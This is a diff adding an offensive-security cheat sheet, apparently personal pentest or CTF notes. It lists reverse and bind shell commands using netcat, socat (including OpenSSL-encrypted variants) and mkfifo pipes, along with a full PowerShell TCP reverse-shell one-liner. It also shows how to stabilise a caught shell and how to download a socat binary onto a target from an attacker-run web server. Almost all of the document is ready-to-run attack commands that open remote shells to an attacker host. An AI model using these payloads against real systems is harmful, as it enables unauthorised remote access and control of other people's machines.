@@ -1,0 +1,123 @@
+# netcat - reverse shell
+
+## target-machine 
+nc <attacker-machine> <attacker-port> -e /bin/bash
+
+## attacker-machine
+nc -lnvp <port>
+
+# netcat - bind shell
+
+## target-machine
+nc -lnvp <port> -e /bin/bash
+
+## attacker-machine
+nc <target-machine> <target-port>
+
+
+================ STABILIZATION OF A NETCAT SHELL on the ATTACKER MACHINE ======================
+
+## stablise netcat shell on the attacker machine
+nc -lnvp <port>
+
+## step 1: execute the piece of python code to get a nice featured shell
+python -c 'import pty;pty.spawn("/bin/sh");'  
+
+## step 2: xterm for getting a clear screen functionality
+export TERM=xterm 
+
+## step 3: execute the following in that order to get tab auto-complete, cntrl+c (kill), up/down arrows
+cntrl + z
+stty raw -echo;
+fg
+
+<< or >> instead of doing the above three steps, just prepend rlwrap before the nc listener command andthat will take of delivering a fully featured shell along with tab auto completion, giving access to history commands, up/down arrows and control+C for killing the process
+
+sudo rlwrap nc -lnvp <port> 
+
+================ STABILIZATION OF A NETCAT SHELL on the ATTACKER MACHINE ======================
+
+Or just use a socat shell, the socat binary needs to be exported from the attackers machine, this can be done with the help of a python webserver
+
+## Attacker's machine, run the following python command where you find the socat binary
+sudo python -m http.server 80
+
+## target machine - linux
+wget <attacker-machine>:80/socat -o /tmp/socat
+## target machine - windows
+Invoke-WebRequest -uri <Local-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
+
+# socat
+
+## reverse shells
+
+## attacker-machine
+socat TCP-L:<port>
+
+## target-machine
+socat TCP:<attacker-machine>:<attacker-port> EXEC:"bash -li"
+socat TCP:<attacker-machine>:<attacker-port> EXEC:powershell.exe,pipes
+
+
+## bind shells
+
+## attacker-machine
+socat TCP:<target-machine>:<target-port>
+
+## target-machine
+socat TCP-L:<PORT> EXEC:"bash -li"
+socat TCP-L:<PORT> EXEC:powershell.exe, pipes
+
+
+============================ STABLIZING socat reverse shells ================================
+
+socat TCP-L:<port> FILE:`tty`,raw,echo=0
+
+socat TCP:<attacker-machine>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+============================ STABLIZING socat reverse shells ================================= 
+
+# socat encrypted shells
+
+# reverse shells
+
+## attacker machine
+socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -
+
+## target machine
+socat OPENSSL:<attacker-machine>:<attacker-port>,verify=0 EXEC:/bin/bash
+
+
+# bind shells
+
+## attacker machine
+
+socat OPENSSL:<target-machine>:<target-port>,verify=0 -
+
+
+## target machine
+
+socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+
+
+## example:- 
+
+socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE=`tty`,raw,echo=0
+
+socat OPENSSL:10.10.3.12:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+
+
+### Common shell payloads
+
+## bind shell
+`mkfifo /tmp/f;nc -lnvp <PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm -rf /tmp/f`
+
+## reverse shell
+`mkfifo /tmp/f; nc <attacker-host> <attacker-port> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm -rf /tmp/f`
+
+## windows 
+`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+
+## 
+`sudo nc -lnvp 443`
